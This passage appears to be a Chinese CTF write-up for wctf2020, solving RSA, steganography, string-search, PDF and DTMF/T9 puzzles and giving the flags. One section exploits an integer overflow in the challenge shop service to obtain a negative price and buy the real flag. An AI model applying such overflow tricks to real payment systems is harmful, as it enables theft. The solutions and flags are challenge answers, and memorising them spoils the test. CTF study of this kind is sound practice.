
```python
#!/usr/bin/python
#-*-coding:utf-8-*-
#__author__:TaQini

N = 2537
e = 13
d = 937
c = [156, 821, 1616, 41, 140, 2130, 1616, 793]
m = [pow(i, d, N) for i in c]
flag=[chr(ord('a')+i) for i in m]

print ''.join(flag)
```

> flag:  wctf2020{iloveyou}



## babyrsa

给了n，拿到[factordb](http://www.factordb.com)可以直接分解

```python
#!/usr/bin/python
#__author__:TaQini

import gmpy2
from Crypto.Util import number

c = 28767758880940662779934612526152562406674613203406706867456395986985664083182
n = 73069886771625642807435783661014062604264768481735145873508846925735521695159
e = 65537

p=189239861511125143212536989589123569301
q=386123125371923651191219869811293586459

# print p
# print q

d = gmpy2.invert(e, (p-1)*(q-1))
# print d

m = pow(c, d, p*q)

print( number.long_to_bytes(m) )
```



# Misc

## Space Club

附件是一堆空格，长的代表1，短的代表0，得到二进制串儿转成字符串即可：

```python
In [7]: a=0b01110111011000110111010001100110001100100011000000110010001100000111
   ...: 101101101000001100110111001001100101010111110011000101110011010111110111
   ...: 100100110000011101010111001001011111011001100110110001000000011001110101
   ...: 111101110011001100010111100001011111011100110011000101111000010111110111
   ...: 0011001100010111100001111101

In [8]: hex(a)[2:-1].decode('hex')
Out[8]: 'wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}'
```



## Welcome

题目描述：

> 《论语》：三人行，必有我师焉。

附件是个py写的人脸识别软件，出题人tql... 识别到三个人就给flag~

人数不够，照片来凑。



## 爬

爬爬爬

先把pdf转成word格式([pdf2word](https://online2pdf.com/pdf2word)) ，然后随手对图片缩放了一下，发现原来有两张图片：

![](http://image.taqini.space/img/20200328204601.png)

打开docx文件找到图片，hex2str即可：

![](http://image.taqini.space/img/20200328204257.png)

> flag: wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}



## Find me

直接搜字符串

```shell
$ rabin2 -zz find_me.jpg | grep ctf
7    0x00000828 0x00000828 36   74           utf16le wctf2020{y$0$u_f$1$n$d$_M$e$e$e$e$e}
10   0x000010bc 0x000010bc 25   52           utf16le wctf2020{y0u_f1nd_mE>>-+}
```

发现有俩？都试了下，有一个是对的，哪个是对的，我也忘了。



##  Shop

这题比较好玩儿~ nc连接上是个shop界面：

```
Welcome to wctf2020 shop
You can buy flags here
===========================================

1. Balance
2. Buy Flags
3. Exit

 Enter a menu selection
```

选1显示余额只有2020，选2显示在售的有两种flag，便宜的999一个，可以一次购买多个，真的flag要100000刀，买不起。

作为一名pwn选手，直接整数溢出就完事儿了。让购买次数*999等于负数，看看能不能让卖家倒贴钱。

整型数最大值是`2147483647`，超过这个值就会溢出成负数：`2147483647+1=-2147483648`

```python
In [1]: (2147483647+2020)/999+1
Out[1]: 2149636
```

算一下只要买`2149636`个假flag就能完成溢出，试了一下，果然卖家贴钱了

```
The final cost is: -2147480932

Your current balance after transaction: 2147482952
```

然后就开开心心的拿着巨款去买真flag啦~

```
 Enter a menu selection
2
Currently for sale
1. Cheaper flag
2. Real lag
2
Real flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: wctf2020{0h_noooo_y0u_r0b_my_sh0p}
```



## girlfriend

炒鸡好玩儿的misc~ 

题目描述：

> 链接: https://pan.baidu.com/s/1_mDokFTuHlscTkV1P6cZ3w 提取码: e5y3
>  I want a girl friend !!!
> 将结果用wctf2020{}再提交

附件是一段手机按键音，百度了下，搜到这篇文章:[听按键音识手机号 - DTMF](https://gamous.cn/index.php/archives/43/)

**DTMF**(**D**ual-**T**one **M**ulti-**F**requency) 即双音多频信号，通过两个频率信号的叠加的方式传递信息。较脉冲信号而言，这种信号传递时稳定便捷，被用于电话系统的拨号信号。

如今，手机也大多默认以 DTMF 的声音作为拨号界面的按键音。因此，只要分析按键音即可从中识别到对应的号码。

|           | 1209Hz | 1336Hz | 1477Hz | 1633Hz |
| --------- | ------ | ------ | ------ | ------ |
| **697Hz** | 1      | 2      | 3      | A      |
| **770Hz** | 4      | 5      | 6      | B      |
| **852Hz** | 7      | 8      | 9      | C      |
| **941Hz** | *      | 0      | #      | D      |

一个高信号与低信号叠加表示 4*4 棋盘上的信号，在频谱中显示为上下俩条水平密集线，经过 FFT 变换可得到两个笔直波峰。



傅里叶变换貌似在大学数据采集课上学过，于是尝试了一下。。。这也太复杂了！放弃。。数学太难了。

然后开心地在Audacity菜单栏找到了频谱分析功能~~~

![](http://image.taqini.space/img/20200328034046.png)

对每个按键音进行频谱分析，可以得到两个信号频率值(图中峰值)，查**DTMF**表即可解得相应数字/字母。

后来在github上找到了一个七年前的脚本 [dtmf-decoder.py](https://github.com/hfeeki/dtmf/blob/master/dtmf-decoder.py) (还能用)，跑出来一串神秘数字：

``` python
999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777
```

看了半天，也不知道这是神马玩意。乘法算式么？于是卡住了，就去做其他题了。

后来我拿起手机，灵机一动！这不是T9键盘么(“▔□▔)`

![](http://image.taqini.space/img/65E524BBA435784B11AB8FA892CB614D.jpg)

数字重复三次表示按键按下了三次，选择相应的字母....最终解得：
``` 
YOUAREMYGIRLFRIENDS
```

> flag:  wctf2020{youaremygirlfriends}

这题太有意思了叭。。。



# End

最后就晒一下得分榜叭~

![](http://image.taqini.space/img/532C4720214BE6C8C3162202281AC47D.jpg)

![](http://image.taqini.space/img/577627EA4BC1FA4C746664FF4BA4E985.jpg)

[imagin师傅](https://imagin.vip/)  ddw  ε٩ (๑> 灬 <)۶з